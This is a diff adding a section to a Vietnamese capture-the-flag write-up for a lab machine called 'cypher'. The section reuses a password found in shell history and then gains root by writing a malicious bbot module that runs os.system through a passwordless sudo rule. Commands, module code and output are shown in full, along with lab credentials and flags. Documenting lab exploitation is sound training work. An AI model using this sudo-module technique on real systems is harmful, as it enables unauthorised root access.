@@ -178,6 +178,109 @@ Tôi mở file `.bash_history` thì có mật khẩu là:
 ```
 neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK
 ```
+Đăng nhập thử với user `graphasm` với mật khẩu là `cU4btyib.20xtCMCXkBmerhK` thì vào được:
+```
+graphasm@cypher:~$ cat user.txt  
+b35304bdfb497923f9440a0fa4db51c8
+```
+Chạy `sudo -l` thì có bbot là có thể chạy dưới quyền root mà không cần mật khẩu:
+```
+graphasm@cypher:~$ sudo -l
+Matching Defaults entries for graphasm on cypher:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User graphasm may run the following commands on cypher:
+    (ALL) NOPASSWD: /usr/local/bin/bbot
+```
+Có thể đọc thêm về [bbot](https://github.com/blacklanternsecurity/bbot/tree/stable/bbot/modules), tôi nhận thấy có các module và trong đó là các file python, ngoài ra có thể tự viết module, tham khảo tại [đây](https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/)
+
+Tôi tự viết thêm module để thực hiện đọc các file nhạy cảm trong `/root`
+
+Tạo file `testModule.yml` và thư mục `testModule`, bên trong thư mục là file python `testModule.py` vói nội dung như dưới: 
+
+```
+graphasm@cypher:~$ cat testModule.yml 
+modules:
+- testModule
+module_dirs:
+- /home/graphasm/testModule
+graphasm@cypher:~$ ls
+bbot_preset.yml  bbot_scans  testModule  testModule.yml  user.txt
+graphasm@cypher:~$ cat testModule/testModule.py 
+from bbot.modules.base import BaseModule
+import os
+os.system("cat /root/root.txt > /home/graphasm/flag.txt")
+def MyModule(BaseModule):
+    watched_events = ["DNS_NAME"]
+    async def handle_event(self, event):
+        import os
+        os.system("cat /root/root.txt > /home/graphasm/flag.txt")
+```
+
+Chạy bbot thì sẽ thực thi được lệnh trong đoạn `handle_event` trong python:
+
+```
+graphasm@cypher:~$ sudo /usr/local/bin/bbot -p /home/graphasm/testModule.yml --force
+  ______  _____   ____ _______
+ |  ___ \|  __ \ / __ \__   __|
+ | |___) | |__) | |  | | | |
+ |  ___ <|  __ <| |  | | | |
+ | |___) | |__) | |__| | | |
+ |______/|_____/ \____/  |_|
+ BIGHUGE BLS OSINT TOOL v2.1.0.4939rc
+
+www.blacklanternsecurity.com/bbot
+
+[INFO] Scan with 1 modules seeded with 0 targets (0 in whitelist)
+[WARN] Failed to load unknown module "testModule"
+[ERRR] Failed to load 1 scan modules: testModule
+[INFO] Loaded 5/5 internal modules (aggregate,cloudcheck,dnsresolve,excavate,speculate)
+[INFO] Loaded 5/5 output modules, (csv,json,python,stdout,txt)
+[INFO] internal.excavate: Compiling 10 YARA rules
+[INFO] internal.speculate: No portscanner enabled. Assuming open ports: 80, 443
+[SUCC] Setup succeeded for 12/12 modules.
+[SUCC] Scan ready. Press enter to execute cold_wanda
+
+[WARN] No scan targets specified
+[SUCC] Starting scan cold_wanda
+[SCAN]              	cold_wanda (SCAN:f7ff09830eaf7d2881fae80cbff0ac6e7b17826e)	TARGET	(in-scope, target)
+[INFO] Finishing scan
+[SCAN]              	cold_wanda (SCAN:f7ff09830eaf7d2881fae80cbff0ac6e7b17826e)	TARGET	(in-scope)
+[SUCC] Scan cold_wanda completed in 0 seconds with status FINISHED
+[INFO] aggregate: +----------+------------+------------+
+[INFO] aggregate: | Module   | Produced   | Consumed   |
+[INFO] aggregate: +==========+============+============+
+[INFO] aggregate: | None     | None       | None       |
+[INFO] aggregate: +----------+------------+------------+
+[INFO] output.csv: Saved CSV output to /root/.bbot/scans/cold_wanda/output.csv
+[INFO] output.json: Saved JSON output to /root/.bbot/scans/cold_wanda/output.json
+[INFO] output.txt: Saved TXT output to /root/.bbot/scans/cold_wanda/output.txt
+graphasm@cypher:~$ cat flag.txt 
+eb4dc7fccd95c43a164f448f212a6ba2
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
